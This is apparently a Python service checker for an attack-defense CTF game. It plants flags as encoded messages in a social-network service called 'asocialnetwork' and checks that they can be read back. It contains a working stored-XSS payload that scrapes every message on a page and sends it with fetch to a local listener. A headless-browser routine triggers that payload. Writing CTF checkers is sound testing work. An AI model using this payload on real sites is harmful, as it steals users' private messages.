import json
import secrets
from typing import Optional
from httpx import AsyncClient
import functools
from logging import LoggerAdapter
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    ExploitCheckerTaskMessage
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
HOST = "0.0.0.0"
PORT = 5555

SERVICE_PORT = 3000
checker = Enochecker("asocialnetwork", SERVICE_PORT)
app = lambda: checker.app


def encode(message, recipient):
    recipient = recipient * (len(message) // len(recipient) + 1)
    return functools.reduce(lambda a, b: a+b, ([chr(ord(a) ^ ord(b)) for (a,b) in zip(message, recipient)]))


async def register(task, client, username, password, logger):
    logger.debug(f"Registering as {username}:{password}")
    r = await client.post(f"{task.address + ':' + str(SERVICE_PORT)}/register", json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302, "registering failed")
    return r.cookies


async def login(task, client, username, password, logger):
    logger.debug(f"Logging in as {username}:{password}")
    r = await client.post(f"{task.address + ':' + str(SERVICE_PORT)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 302, "login failed")
    return r.cookies


async def sendMessage(task, client, recipient, message, logger):
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    encoded_message = encode(message, recipient)
    cookie = await register(task, client, username, password, logger)
    await client.post(f"{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": recipient, "message": encoded_message}, cookies=cookie)
    return username, password, cookie


async def retrieveMessage(task, client, recipient, logger, username, password):
    cookie = await login(task, client, username, password, logger)
    logger.debug(f"Retrieving Message for {username}:{password}")
    r = await client.get(f"{task.address + ':' + str(SERVICE_PORT)}/messages/{recipient}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving message failed")
    return r

@checker.putflag(0)
async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> str:
    flag = task.flag
    logger.debug(task.address + ':' + str(SERVICE_PORT))
    recipient = "admin"
    username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
    r = await retrieveMessage(task, client, recipient, logger, username, password)
    assert_in(flag, r.text, "flag missing from messages")
    await chain_db.set("userdata", (username, password, flag))
    return json.dumps({'username': username})


@checker.getflag(0)
async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    start = time.time()
    try:
        username, password, flag = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    r = await retrieveMessage(task, client, "admin", logger, username, password)
    assert_in(task.flag, r.text, "flag missing from note")
    # xss(task, start, logger)

@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
    noise = secrets.token_hex(32)
    recipient = "admin"
    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
    await chain_db.set("noise", (username, password, noise))


@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    r = await retrieveMessage(task, client, "admin", logger, username, password)
    assert_in(noise, r.text, "noise missing from note")


exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
result = [None]

webServer = [None]
def server(logger):
    class MyServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            logger.debug(post_data)
            result[0] = post_data.decode()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())
    webServer[0] = HTTPServer((HOST, PORT), MyServer)
    print("Server started http://%s:%s" % (HOST, PORT))
    try:
        webServer[0].serve_forever()
    except KeyboardInterrupt:
        pass

    webServer[0].server_close()
    print("Server stopped.")


@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
    threading.Thread(target=server, args=(logger, )).start()
    cookie = await login(task, client, "a", "a", logger)
    r = await client.post(f"{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": task.attack_info, "message": encode(exploitMessage, task.attack_info)}, cookies=cookie)
    assert_equals(r.status_code, 200, "exploit failed")
    while not result[0]:
        time.sleep(0.1)
    logger.debug(result[0])
    webServer[0].server_close()
    if flag := searcher.search_flag(result[0]):
        return flag


def xss(task, start, logger):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless=new')
    driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
    driver.get(f"{task.address + ':' + str(SERVICE_PORT)}/messages/admin")
    reloads = 0
    while True:
        if time.time() - start > ((task.timeout / 1000) - 1):
            break
        driver.refresh()
        reloads += 1
    logger.debug(reloads)
    driver.quit()

if __name__ == "__main__":
    checker.run()

